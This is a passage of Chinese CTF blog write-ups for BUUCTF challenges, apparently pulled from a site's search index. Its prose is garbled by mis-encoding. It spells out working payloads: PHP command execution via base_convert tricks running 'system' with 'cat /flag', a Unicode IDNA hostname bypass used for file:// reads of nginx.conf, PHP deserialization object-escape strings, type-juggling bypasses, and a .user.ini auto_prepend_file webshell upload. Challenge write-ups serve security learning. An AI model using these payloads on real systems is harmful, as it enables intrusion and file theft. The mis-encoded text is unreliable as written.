ä¸Šæ‹¬å·å³å¯è¢«å½“ä½œå‡½æ•°æ‰§è¡Œï¼š 1c=($_GET[a])($_GET[b]) æ•…æ­¤æ—¶æˆ‘ä»¬æ„é€ çš„payloadä¸ºï¼š 1c=($_GET[a])($_GET[b])&amp;a=system&amp;b=cat /flag ä»è¿‡æ»¤å†…å®¹ä¸­å¯ä»¥å‘ç°è¿‡æ»¤äº†ä¸­æ‹¬å·ï¼Œä»¥åŠgetå‡½æ•°è¿˜æœ‰å˜é‡è¯¥æ€ä¹ˆç»•è¿‡å‘¢ï¼Ÿ1.å˜é‡ç»•è¿‡ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ç™½åå•é‡Œé¢çš„å˜é‡ï¼Œå°±piï¼Œé‚£ä¹ˆ$_GETè¯¥å¦‚ä½•æ„é€ å‘¢ï¼Ÿè¿™é‡Œå°±éœ€è¦å¯å˜å˜é‡ä»¥åŠä¸Šé¢åˆšè¯´è¿‡çš„å­—ç¬¦ä¸²ä½œä¸ºå‡½æ•°åæ‰§è¡Œç»•è¿‡,è§£æä¸€ä¸‹ä¸€ä¸‹payloadï¼šbase_convert(37907361743,10,36)å¯ä»¥å°†åè¿›åˆ¶æ•°è½¬ä¸º36è¿›åˆ¶ï¼Œ36è¿›åˆ¶å°±æœ‰A-Zçš„å®Œæ•´å­—ç¬¦ï¼Œæ¥ä¸‹æ¥ä½¿ç”¨dechex(1598506324)å°†è¯¥åè¿›åˆ¶æ•°è½¬ä¸ºåå…­è¿›åˆ¶æ•°çš„$_GETï¼Œä¸¤è¾¹éƒ½è½¬ä¸ºåæ‹¼æ¥èµ·æ¥å³ä¸º:hex2bin(â€œ5f474554â€)å°±ä¸º_GETç„¶åå’Œåé¢çš„$ï¼ˆå¯å˜å˜é‡å¼•å…¥ï¼‰å³å¯æ‹¼æ¥å¤„æˆ‘ä»¬éœ€è¦çš„å†…å®¹ 1$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){cos})&amp;pi=system&amp;cos=cat /flagxxxxxxxxxx c=$pi=base_convert($pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){cos})&amp;pi=system&amp;cos=cat /flag) [BSidesCF 2020]Had a bad dayfilterä¼ªåè®®å¯è¯»å– [SUCTF 2019]Pythonginx123456789101112131415161718192021 @app.route('/getUrl', methods=['GET', 'POST'])def getUrl(): url = request.args.get(&quot;url&quot;) host = parse.urlparse(url).hostname if host == 'suctf.cc': return &quot;æˆ‘æ‰Œ your problem? 111&quot; parts = list(urlsplit(url)) host = parts[1] if host == 'suctf.cc': return &quot;æˆ‘æ‰Œ your problem? 222 &quot; + host newhost = [] for h in host.split('.'): newhost.append(h.encode('idna').decode('utf-8')) parts[1] = '.'.join(newhost) #å»æ‰ url ä¸­çš„ç©ºæ ¼ finalUrl = urlunsplit(parts).split(' ')[0] host = parse.urlparse(finalUrl).hostname if host == 'suctf.cc': return urllib.request.urlopen(finalUrl).read() else: return &quot;æˆ‘æ‰Œ your problem? 333&quot; çœ‹äº†ä¸€ä¸‹ åŸæ¥ä»–æ˜¯è¿™ä¸ªæ„æ€ï¼Œå‰ä¸¤æ¬¡çš„æ¯”å¯¹ä¸­ä¸èƒ½ç­‰äºsuctf.ccï¼Œæœ€åé‚£æ¬¡çš„æ¯”å¯¹ä¸­éœ€è¦å«æœ‰suctf.ccæ‰å¯ä»¥è¿›å…¥urlopenï¼Œè¿›è¡Œæ–‡ä»¶è¯»å–å‘½ä»¤è¿™é‡Œå°±æœ‰ä¸ªç¼–ç çš„æ¼æ´:https://bugs.python.org/issue36216æ„Ÿè§‰è¿˜æ˜¯å®é™…å»æ¼”ç¤ºä¸€éå¹¶è¾“å‡ºç»“æœæ‰èƒ½æ˜äº† 12345678910111213141516171819202122232425262728293031323334353637383940from urllib.parse import urlparse,urlunsplit,urlsplitfrom urllib import parsedef get_unicode(): for x in range(65536): uni=chr(x) print(&quot;this is the oorgin&quot;,uni) url=&quot;http://suctf.c{}&quot;.format(uni) print(&quot;this is the orgin&quot;,url) try: if getUrl(url): print(&quot;str: &quot;+uni+' unicode: \\\\u'+str(hex(x))[2:]) except: passdef getUrl(url): url = url host = parse.urlparse(url).hostname print(&quot;this is first:&quot;,host) if host == 'suctf.cc': return False parts = list(urlsplit(url)) print(&quot;this is second:&quot;,parts) host = parts[1] if host == 'suctf.cc': return False newhost = [] for h in host.split('.'): newhost.append(h.encode('idna').decode('utf-8')) parts[1] = '.'.join(newhost) print(&quot;this is third:&quot;,parts) finalUrl = urlunsplit(parts).split(' ')[0] host = parse.urlparse(finalUrl).hostname if host == 'suctf.cc': return True else: return Falseif __name__==&quot;__main__&quot;: get_unicode() æ ¹æ®å¤§ç¥çš„è„šæœ¬è¿›è¡Œå­¦ä¹ å§ï¼Œè¿™é‡Œç”¨å¾—æ˜¯python3ï¼Œå¯¼å…¥äº†ä¸¤ä¸ªåº“è¿™è¾¹å­¦ä¹ ä¸€ä¸‹å‡ ä¸ªå‡½æ•°:https://my.oschina.net/u/2474096/blog/1593377è¿™é‡Œæ˜¯ç›¸å…³å‡½æ•°çš„ä½œç”¨ï¼Œä½†æ˜¯è¿™é‡Œé‡ç‚¹å…³æ³¨çš„æ˜¯ä»–ä»¬çš„è§£ç ç»“æœè¿™é‡Œåªå–ä¸€ç»„æ•°æ®æ¥è§‚å¯Ÿ: 1234this is first: suctf.cï½ƒthis is second: ['http', 'suctf.cï½ƒ', '', '', '']this is third: ['http', 'suctf.cc', '', '', '']str: ï½ƒ unicode: \\uff43 å¯ä»¥å‘ç°å½“è§£ç å½¢å¼ä¸ºurlparseä»¥åŠurlsplitçš„æ—¶å€™ï¼Œä¸ä¼šè½¬åŒ–åŸæœ¬çš„å­—ç¬¦ï¼Œä½†æ˜¯å½“è¢«idnaç¼–ç å†ç»ç”±utf-8è§£ç åï¼ŒåŸæœ¬çš„è¿™é‡Œæˆä¸ºæ€ªå¼‚å­—ç¬¦è¢«è½¬åŒ–ä¸ºæ­£å¸¸çš„å­—ç¬¦cæ­¤æ—¶ç»•è¿‡æˆåŠŸ åœ¨pythonè·‘å‡ºæ¥çš„Cå­—ç¬¦ä¸­é€‰æ‹©ä¸€ä¸ªè¿›å»æ‹¼æ¥å°±è¡Œï¼Œæˆ‘åœ¨burpé‡Œé¢è·‘ï¼Œä½†å¯èƒ½æ²¡æœ‰ç¼–è¯‘è¿™ä¸ªå­—ç¬¦æ‰€ä»¥æ²¡è·‘å‡ºæ¥ï¼Œå›åˆ°urlä¸­å°±å¯ä»¥äº†ï¼Œè¿™é‡Œè¯´ä¸€ä¸‹ä¸ºå•¥çŸ¥é“ç”¨file://åè®®ï¼Œå› ä¸ºé¢˜ç›®è¯´å°±åœ¨suctf.ccä¸­ï¼Œé‚£å¤§æ¦‚ç‡å°±æ˜¯ä»¥è¿™ä¸ªä¸ºæ ¹ç›®å½•ï¼Œç±»ä¼¼äº127.0.0.1ï¼Œæ‰€ä»¥æ­¤æ—¶å¯ä»¥ç”¨file://åè®®ç›´æ¥è®¿é—®ï¼ˆhttpåè®®ä¸­çš„çŸ¥è¯†ç‚¹ï¼‰æ¥ä¸‹æ¥å¯»æ‰¾flagçš„ä½ç½®ï¼Œè¿™é¢˜æºç ä¸­ç»™åˆ°æç¤º: 1&lt;!-- Do you know the nginx? --&gt; é‚£åº”è¯¥æ˜¯åœ¨Nginxçš„é…ç½®ç›®å½•å—ï¼Ÿè®©æˆ‘ä»¬åº·åº· 12?url=file://suctf.câ“’/usr/local/nginx/conf/nginx.conf?url=file://suctf.câ“’/usr/fffffflag","link":"/2021/04/11/buuctf8/"},{"title":"buuctf9","text":"[å®‰æ´µæ¯ 2019]easy_serialize_phpååºåˆ—åŒ–é¢˜ç›®: 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?php$function = @$_GET['f'];function filter($img)//å®šä¹‰è¿‡æ»¤å†…å®¹{ $filter_arr = array('php', 'flag', 'php5', 'php4');//å±…ç„¶æ˜¯è¿‡æ»¤åç¼€ï¼Ÿ $filter = '/' . implode('|', $filter_arr) . '/i'; return preg_replace($filter, '', $img);}if ($_SESSION) { unset($_SESSION);}$_SESSION[&quot;user&quot;] = 'guest';//è¿™è¾¹å¯èƒ½è¦æ”¹ä¸€ä¸‹user$_SESSION['function'] = $function;extract($_POST);if (!$function) { echo '&lt;a href=&quot;buuease_serialize.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;';}if (!$_GET['img_path']) {//getä¸€ä¸ªimg_path $_SESSION['img'] = base64_encode('guest_img.png');} else { $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));}$serialize_info = filter(serialize($_SESSION));//å¯¹sessionè¿›è¡Œåºåˆ—åŒ–ç„¶åè¿‡æ»¤å†…å®¹ã€‚if ($function == 'highlight_file') { highlight_file('buuease_serialize.php');} else if ($function == 'phpinfo') { eval('phpinfo();'); //maybe you can find something in here!æ„Ÿè§‰è¿™é‡Œåªæ˜¯å‘Šè¯‰æˆ‘ä»¬flagåœ¨å“ªä¸ªæ–‡ä»¶å¤¹é‡Œé¢ï¼Œå…¶æ„é€ æ”»å‡»æ‰‹æ³•è¿˜æ˜¯å¾—æˆ‘ä»¬è‡ªå·±æ¥} else if ($function == 'show_image') { $userinfo = unserialize($serialize_info);//è¿›è¡Œååºåˆ—åŒ–ã€‚ echo file_get_contents(base64_decode($userinfo['img']));//ç›®æ ‡å°±æ˜¯è¿›å…¥è¿™é‡Œ} extract():eå‡½æ•°ä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ã€‚ è¯¥å‡½æ•°ä½¿ç”¨æ•°ç»„é”®åä½œä¸ºå˜é‡åï¼Œä½¿ç”¨æ•°ç»„é”®å€¼ä½œä¸ºå˜é‡å€¼ã€‚é’ˆå¯¹æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ ï¼Œå°†åœ¨å½“å‰ç¬¦å·è¡¨ä¸­åˆ›å»ºå¯¹åº”çš„ä¸€ä¸ªå˜é‡ã€‚ è¯¥å‡½æ•°è¿”å›æˆåŠŸè®¾ç½®çš„å˜é‡æ•°ç›®ã€‚ 1234567&lt;?php$a = &quot;Original&quot;;$my_array = array(&quot;a&quot; =&gt; &quot;Cat&quot;,&quot;b&quot; =&gt; &quot;Dog&quot;, &quot;c&quot; =&gt; &quot;Horse&quot;);extract($my_array);echo &quot;\\$a = $a; \\$b = $b; \\$c = $c&quot;;?&gt;//$a = Cat; $b = Dog; $c = Horse å¤§è‡´æ¸…æ¥šä»£ç é€»è¾‘åï¼Œæˆ‘ä»¬å…ˆçœ‹çœ‹phpinfoé‡Œé¢æä¾›äº†å•¥ä¿¡æ¯: flagæ‰€åœ¨æ–‡ä»¶å~å¤§æ¦‚æ˜¯è¦è¯»å–æ–‡ä»¶æºç  å‰ä¸¤å¤©åœ¨å­¦åºåˆ—åŒ–çš„çŸ¥è¯†çš„æ—¶å€™æœ‰çœ‹åˆ°ä¸€ä¸ªpharçš„ä¼¼ä¹è·Ÿæ–‡ä»¶æœ‰å…³ï¼Œç„¶åè¿™é‡Œä¹Ÿæ˜¯å…è®¸ï¼Ÿä¼šä¸ä¼šæœ‰ç‚¹æå¤´ï¼Ÿç»§ç»­å¾€ä¸‹çœ‹çœ‹ å¥½çš„æ²¡æœ‰æå¤´ï¼Œå› ä¸º:æ ¹æ®æ–‡ä»¶ç»“æ„æˆ‘ä»¬æ¥è‡ªå·±æ„å»ºä¸€ä¸ªpharæ–‡ä»¶ï¼Œphpå†…ç½®äº†ä¸€ä¸ªPharç±»æ¥å¤„ç†ç›¸å…³æ“ä½œã€‚ æ³¨æ„ï¼šè¦å°†php.iniä¸­çš„phar.readonlyé€‰é¡¹è®¾ç½®ä¸ºOffï¼Œå¦åˆ™æ— æ³•ç”Ÿæˆpharæ–‡ä»¶ã€‚æœ¬åœ°æµ‹è¯•æŠ“åŒ…ä¼ ä¸€ä¸‹å€¼å§ éœ€è¦è§£å†³çš„é—®é¢˜å¦‚ä¸‹:1.å¯¹äºä¼ å…¥çš„img_pathä¼šè¿›è¡ŒåŠ å¯†å¤„ç†ï¼Œé‚£ä¹ˆä¼ å…¥åˆ°unserializeå†…å®¹ä¸­ä»¥åå°±æ— æ³•è¢«ååºåˆ—åŒ–äº†2.è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªextract()å‡½æ•°ï¼Œä½†æ˜¯ä»–ä¼šè¢«filterè¿‡æ»¤å†…å®¹ï¼Œæ‰€ä»¥è¿™é‡Œè¦æƒ³æƒ³å¦‚ä½•ç»•è¿‡ï¼Œè®©ååºåˆ—åŒ–æ‰§è¡Œæˆ‘ä»¬çš„æ–‡ä»¶è¯»å–ç±»ã€‚å¥½çš„æƒ³ä¸å‡ºæ¥ï¼Œçœ‹wpå‘ç° PHPååºåˆ—åŒ–çš„å¯¹è±¡é€ƒé€¸è¿™é¢˜å’Œæˆ‘åœ¨éš”å£æ–‡æ¡£æ¼”ç¤ºçš„åˆæœ‰ç‚¹ä¸å¤ªä¸€æ ·ï¼Œè¿™é‡Œæˆ‘ä»¬è·å¾—æ–‡æœ¬çš„ç‚¹åœ¨äº ï¼šbase64_decode($userinfo[â€˜imgâ€™])æ‰€ä»¥æ­¤æ—¶æˆ‘ä»¬éœ€è¦å«æœ‰flagçš„å­—ç¬¦ä¸²ç¼–ç è¢«åºåˆ—åŒ–å†…å®¹èˆå¼ƒæ‰ï¼Œå¦‚ä½•èˆå¼ƒå‘¢ï¼Ÿå°±æ˜¯è®©å‰é¢çš„å†…å®¹è¢«è¿‡æ»¤ï¼Œé‚£ä¹ˆåºåˆ—åŒ–çš„å­—ç¬¦ä¸²å°±ä¼šå¾€ä¸‹è¯»å–å­—ç¬¦è¿™é‡Œæœ‰ä¸ªè¯¯åŒºï¼šåé¢è¯»å–æ–‡ä»¶çš„è€Œæ˜¯åºåˆ—åŒ–å†…çš„imgå€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸¢æ‰çš„æ˜¯æœ¬æ¥æœ‰çš„imgå€¼ï¼ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ä¼ å…¥çš„å€¼è¦åœ¨ç¨‹åºæœ¬æ¥è‡ªå¸¦çš„imgçš„å‰é¢ flagæ–‡ä»¶base64åŠ å¯†åä¸º: 1ZDBnM19mMWFnLnBocA== æ•‘å‘½ é‡åˆ°å¤§å‘äº†ï¼Œæˆ‘ä»¬åˆ©ç”¨çš„æ˜¯flagç­‰å­—ç¬¦ä¼šè¢«è½¬åŒ–ä¸ºç©ºæ¥åƒæ‰åé¢çš„å­—ç¬¦ï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬ä¼ å…¥çš„æ•°æ®æ—¶ï¼š 1_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[img]=Z3Vlc3RfaW1nLnBuZw==&amp;_SESSION[function]=a&quot;;s:3:&quot;img&quot;;s:4:&quot;aaaa&quot;;s:3:&quot;img&quot;;s:4:&quot;aaaa&quot;;} è¿™æ ·å­çš„è¯åƒæ‰å°±æ˜¯imgï¼Œè™½ç„¶å¤šæ„é€ å‡ ä¸ªflagä¹Ÿèƒ½æŠŠfunctionçš„48å­—ç¬¦ç»™åƒæ‰ï¼Œä½†æ˜¯å°±æ— æ³•ä¼ å…¥imgå€¼ä¹Ÿå°±æ˜¯æ‰“å¼€æˆ‘ä»¬çš„flag://a:3:{s:4:â€userâ€;s:24:â€â€;s:3:â€imgâ€;s:20:â€Z3Vlc3RfaW1nLnBuZw==â€;s:8:â€functionâ€;s:46:â€aâ€;s:3:â€imgâ€;s:4:â€aaaaâ€;s:3:â€imgâ€;s:4:â€aaaaâ€;}â€;} åƒè¿™ä¸ªæœ‰46çš„å‡ºç°å°±æŠ¥é”™äº†~æ‰€ä»¥è¦åƒæ‰å®ƒå‘€ï¼ï¼ï¼ï¼ï¼ï¼å°±è¦å’Œimgäº’æ¢ä½ç½®ï¼Œæ‰€ä»¥çœŸæ­£çš„payloadä¸º: 12_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;}_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;} 12a:3:{s:4:&quot;user&quot;;s:24:&quot;&quot;;s:8:&quot;function&quot;;s:59:a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;}&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;}//è¿™é‡Œè¯´æ˜ä¸€ä¸‹ æœ€åè¿˜è¦æ„é€ ä¸€ä¸ªs:2:&quot;dd&quot;;s:1:&quot;a&quot;;è¿™ä¸ªå¯¹è±¡ï¼Œå› ä¸ºè¿™æ ·æ‰èƒ½æŠŠZ3Vlc3RfaW1nLnBuZw==è¿™ä¸ªå›¾ç‰‡ç»™æŒ¤å‡ºå»ï¼Œä¸å¹²æ‰°æˆ‘ä»¬çš„ç»“æœ è°ƒè¯•ä»£ç : 123456789101112131415&lt;?phpfunction filter($img)//å®šä¹‰è¿‡æ»¤å†…å®¹{ $filter_arr = array('php', 'flag', 'php5', 'php4');//å±…ç„¶æ˜¯è¿‡æ»¤åç¼€ï¼Ÿ $filter = '/' . implode('|', $filter_arr) . '/i'; return preg_replace($filter, '', $img);}$function = &quot;a\\&quot;;s:3:\\&quot;img\\&quot;;s:20:\\&quot;ZDBnM19mMWFnLnBocA==\\&quot;;s:2:\\&quot;dd\\&quot;;s:1:\\&quot;a\\&quot;;}&quot;;$_SESSION[&quot;user&quot;] = 'flagflagflagflagflagflag';//è¿™è¾¹å¯èƒ½è¦æ”¹ä¸€ä¸‹userä¸ºadminï¼Ÿ$_SESSION['function'] = $function;$_SESSION['img']=&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;$serialize_info = filter(serialize($_SESSION));var_dump($serialize_info);$userinfo = unserialize($serialize_info);var_dump($userinfo); å°ç»“è¿™é¢˜ä¸ç®—éš¾ï¼Œä½†æ˜¯å‘ä¸å°‘ï¼Œä¸»è¦æ˜¯ç»†å¿ƒé—®é¢˜ï¼Œå¤šè°ƒè¯•å¾ˆæœ‰ç”¨ï¼ï¼ [0CTF 2016]piapiapiawww.zipæºç æ³„éœ²æ‰“å¼€å®¡è®¡ä¸€ä¸‹:æœ¬åœ°è¿è¡Œçš„æ—¶å€™éœ€è¦æ³¨æ„ mysqlè¦å…¨éƒ¨æ›´æ”¹ä¸ºmysqliï¼ˆç‰ˆæœ¬ä¸åŒï¼‰ åœ¨æœ¬åœ°è¿è¡Œè°ƒè¯•äº†ä¸€ä¸‹ï¼Œå‘ç°æœ‰ç™»å½•æ³¨å†Œè¿˜æœ‰ä¸€ä¸ªæ›´æ–°é¡µé¢ï¼Œç™»å½•æ³¨å†Œé¡µé¢æ²¡å•¥å¤§é—®é¢˜ï¼Œåœ¨æ›´æ–°é¡µé¢å¯ä»¥ä¸Šä¼ æ–‡ä»¶å¹¶ä¸”å°†ä¼šè¢«åºåˆ—åŒ–ï¼Œåœ¨åºåˆ—åŒ–ä¹‹å‰è¿˜ä¼š é’ˆå¯¹æˆ‘ä»¬ä¼ å…¥çš„å†…å®¹è¿›è¡Œä¸€ä¸‹ååºåˆ—åŒ–æ“ä½œåä½¿ç”¨äº†filterè¿›è¡Œè¿‡æ»¤: 1a:4:{s:5:&quot;phone&quot;;s:11:&quot;15559564603&quot;;s:5:&quot;email&quot;;s:12:&quot;10452@qq.com&quot;;s:8:&quot;nickname&quot;;s:3:&quot;123&quot;;s:5:&quot;photo&quot;;s:39:&quot;upload/d41d8cd98f00b204e9800998ecf8427e&quot;;} è¿™é‡Œéœ€è¦åšçš„å°±æ˜¯è®©123â€ä»¥åçš„å†…å®¹è¢«ä¸¢å¼ƒæ‰ï¼Œå’Œä¸Šä¸€é¢˜å·®ä¸å¤šï¼Œç„¶åè¿™é‡Œå¦‚ä½•åƒå­—ç¬¦å‘¢ï¼Ÿfilteré‡Œé¢åªæœ‰whereæ›¿æ¢ä¸ºhackerèƒ½åƒï¼Œæ‰€ä»¥å°±è¦è¾“å…¥å¾ˆå¤šä¸ªwhere ç”±äºéƒ½æœ‰é•¿åº¦é™åˆ¶ï¼Œå¹¶ä¸”åªæœ‰nicknameèƒ½å…¨è¾“å‡ºè‹±æ–‡ï¼Œæ‰€ä»¥éœ€è¦ç»•è¿‡strlenå‡½æ•°ï¼Œå¦‚ä½•ç»•è¿‡å‘¢ï¼Ÿä¼ å…¥æ•°ç»„å°±è¡Œäº†æ¥ä¸‹æ¥ç›´æ¥æ„é€ ä¸€ä¸‹payloadå§ï¼š 1nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;} è§£é‡Šä¸€ä¸‹ ç”±äºæˆ‘ä»¬ä¼ å…¥çš„æ•°ç»„ï¼Œæ‰€ä»¥åºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­ä¹Ÿæ˜¯æ•°ç»„ï¼Œæ‰€ä»¥så‰é¢éœ€è¦æœ‰ä¸ªä¸­æ‹¬å·å’Œåˆ†å·ï¼Œæ‰èƒ½è¾¾åˆ°é—­åˆçš„æ•ˆæœæˆ‘ä»¬ä¸‹è½½æºç åï¼Œå‘ç°configé‡Œé¢æœ‰ä¸ªflagï¼Œæ‰€ä»¥æ¨æµ‹flagåœ¨è¿™é‡Œ å°ç»“:è¿ç»­åšäº†ä¸¤é¢˜è¿™ä¸ªï¼Œæ„Ÿè§‰æ›´åŠ å¾—å¿ƒåº”æ‰‹ä¸€äº›äº†æ€»ç»“ä¸€ä¸‹å°±æ˜¯:1.filteråœ¨åºåˆ—åŒ–ä¹‹åï¼Œå¹¶ä¸”filterçš„æ˜¯åºåˆ—åŒ–åçš„å†…å®¹2.çœ‹çœ‹filterå“ªäº›å¯ä»¥åƒå­—ç¬¦3.æ„é€ å¥½é—­åˆè¯­å¥4.è®©ä¸è¦çš„å­—ç¬¦è¢«ä¸¢å¼ƒ","link":"/2021/04/13/buuctf9/"},{"title":"edusrcæŒ–æ˜","text":"","link":"/2021/03/07/edusrc%E6%8C%96%E6%8E%98/"},{"title":"buuctf3","text":"[HCTF 2018]adminå°è¯•äº†ä¸€ä¸‹sqlæ³¨å…¥ï¼Œå‘ç°ä¸è¡Œï¼Œæ³¨å†Œäº†ä¸€ä¸ªè´¦å·æ‰¾æ‰¾çº¿ç´¢ï¼ŒæŠ“åŒ…çœ‹çœ‹å›æ˜¾ï¼Œå‘ç°ä¸çŸ¥é“æ˜¯ä¸ªå•¥ï¼Œç™¾åº¦äº†ä¸€ä¸‹ï¼Œæ˜¯ä¸€ç§å®‰å…¨æªæ–½ï¼Œç”¨äº†é˜²æ­¢xssç­‰æ”»å‡»çš„ã€‚çœ‹å®Œwpåï¼Œå‘ç°è‡ªå·±çœ‹çš„ä¸å¤Ÿä»”ç»†ï¼Œå‘ç°æ›´æ”¹å¯†ç é¡µé¢æœ‰githubæºç æ³„éœ²ï¼Œæ„Ÿè§‰è‡ªå·±ç»å¸¸è¢«æŸç§æ€è·¯ç»™æŸç¼šä½ï¼Ÿç„¶åå°±å¿˜è®°ä¸€äº›åŸºæ“,ä»¥åè¦æ³¨æ„ç‚¹åˆšçœ‹å®Œäº†wpï¼Œç¡®è®¤è¿‡çœ¼ç¥ï¼Œæ˜¯ä¸ä¼šåšçš„é¢˜ï¼Œç°åœ¨é å°è±¡å¤ç°ä¸€ä¸‹æ€è·¯: buy you flag12345678if (isset($_POST['password'])) { $password = $_POST['password']; if (is_numeric($password)) { echo &quot;password can't be number&lt;/br&gt;&quot;; }elseif ($password == 404) { echo &quot;Password Right!&lt;/br&gt;&quot;; }} æŠ“åŒ… æ€»å…±æ›´æ”¹è¿™äº›åœ°æ–¹ï¼Œç„¶åæœ‰ä¸€ç‚¹æ²¡æƒ³åˆ°ï¼Œçœ‹äº†wpä»–è¯´æœ‰é•¿åº¦é™åˆ¶ï¼Œè¿™é‡Œéœ€è¦æ‹“å±•å­¦ä¹ ä¸€ä¸‹strcmpå­—ç¬¦ä¸²æ¯”è¾ƒç»•è¿‡ï¼Œå› ä¸ºä»–æ— æ³•æ¯”è¾ƒæ•°ç»„çš„é•¿åº¦ï¼Œæ‰€ä»¥åœ¨moneyååŠ ä¸ª[]å³å¯ç»•è¿‡ è¿™é‡Œæœ‰ä¸ªæ€è·¯æ²¡æƒ³æ¸…æ¥š:ä»–è¯´æœ‰é•¿åº¦é™åˆ¶ï¼Ÿè¿™ä¸ªæ—¶å€™æˆ‘ä»¬åº”è¯¥æƒ³çš„æ˜¯ä»€ä¹ˆå‡½æ•°èƒ½æ¯”è¾ƒé•¿åº¦ï¼Ÿç„¶åæŸ¥è¯¢è¯¥å‡½æ•°èƒ½å¦è¢«ç»•è¿‡:æŒ‰ç…§è¿™ä¸ªæ€è·¯æœç„¶å¯ä»¥æ‰¾åˆ°çº¿ç´¢ï¼Œå­¦ä¹ ä¸€ä¸‹ï¼ CheckInçœ‹äº†ä¸€ä¸‹æºç ï¼Œå¯ä»¥ç¡®å®šçš„æ˜¯å¦‚è¦ä¼ å…¥ä¸€å¥è¯æœ¨é©¬éœ€è¦ä½¿ç”¨&lt;script&gt;å†™çš„,åˆšæ‰çœ‹åˆ°ä¸€ä¸ªuser.iniï¼Œæ„Ÿè§‰éœ€è¦åˆ©ç”¨ä¸€ä¸‹è¿™ä¸ªçº¿ç´¢ï¼Œå»ç™¾åº¦çœ‹çœ‹:ä¹‹å‰åœ¨å­¦æ–‡ä»¶ä¸Šä¼ å…¶å®å°±æœ‰çœ‹åˆ°è¿‡è¿™ä¸ªuser.ini æˆ‘ç®€è¦è®²è§£ä¸€ä¸‹ä»¥åŠåˆ©ç”¨æ–¹å¼ï¼Œè¿™ä¸ªæ˜¯ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå¯ä»¥åŠ¨æ€è°ƒæ•´ï¼Œéšæ”¹éšç”¨ï¼Œä½†æ˜¯æƒé™ä¸ºuserï¼Œå…¶ä¸­èƒ½ä¸ºæˆ‘ä»¬æ‰€ç”¨çš„å°±æ˜¯ï¼šauto_prepend_file=**æ–‡ä»¶åè¿™ä¸ªæ˜¯å¯ä»¥ä½¿user.iniæ‰€åœ¨ç›®å½•ä¸‹çš„phpæ–‡ä»¶åŒ…å«æŸä¸ªæ–‡ä»¶ï¼Œæ¯”å¦‚è¯´åœ¨user.iniä¸­æˆ‘é…ç½®äº†auto_prepend_file=12.gif**åœ¨è¿™ä¸ªç›®å½•ä¸‹æœ‰ä¸€ä¸ªindex.phpï¼Œå½“æˆ‘æ‰“å¼€index.phpçš„æ—¶å€™å°±è‡ªåŠ¨åŒ…å«äº†12.gifï¼Œæ–‡ä»¶åŒ…å«ä¼šè‡ªåŠ¨æ‰§è¡Œå…¶ä¸­phpä»£ç ã€‚ æ‰€ä»¥æ•´ä½“æ€è·¯å°±æ˜¯ï¼Œå…ˆä¸Šä¼ user.iniï¼Œç„¶åä¸Šä¼ 12.gifï¼Œç„¶åæ‰“å¼€index.phpé¡µé¢ä½¿ç”¨èšå‰‘è¿æ¥å³å¯:æ–‡ä»¶ä¸Šä¼ ç»•è¿‡åªè¦æ·»åŠ ä¸€ä¸ªå›¾åƒå¤´å°±å¯ä»¥ï¼Œæ¯”å¦‚GIF98a,ä¸€å¥è¯æœ¨é©¬ä½¿ç”¨&lt;script&gt;ä¹¦å†™æ–¹å¼ æˆåŠŸåŒ…å« æˆåŠŸè¿æ¥ flag{fe873bd0-b289-495f-8254-ec9f4e68b1e6} flag{ed3c91a9-9f59-480e-8595-a410ad4e6175}æ‹¿åˆ°flag https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html Easy MD5MD5çš„è€ƒç‚¹ï¼Œç¬¬ä¸€ä¸ªæ˜¯å¼±ç­‰äºï¼Œæ‰€ä»¥åªè¦æ‰¾MD5å€¼ä¸º0eå¼€å¤´çš„å°±è¡Œï¼Œæ¥ä¸‹æ¥æ˜¯å¼ºç­‰äºï¼Œå¼ºç­‰äºç›´æ¥è®©å€¼ä¸ºæ•°ç»„ç±»å‹ï¼Œå› ä¸ºMD5è½¬åŒ–æ•°ç»„ç›´æ¥ä¸º0 NiZhuanSiWei12345678910111213141516171819 &lt;?php $text = $_GET[&quot;text&quot;];$file = $_GET[&quot;file&quot;];$password = $_GET[&quot;password&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,'r')===&quot;welcome to the zjctf&quot;)){ echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,'r').&quot;&lt;/h1&gt;&lt;/br&gt;&quot;; if(preg_match(&quot;/flag/&quot;,$file)){ echo &quot;Not now!&quot;; exit(); }else{ include($file); //useless.php $password = unserialize($password); echo $password; }}else{ highlight_file(__FILE__);}?&gt; file_get_contents()å‡½æ•°ï¼Œä»æ–‡ä»¶ä¸­è·å–å†…å®¹ï¼Œè¿™é‡Œä½¿ç”¨data://ä¼ªåè®®è¿›è¡Œç»•è¿‡ 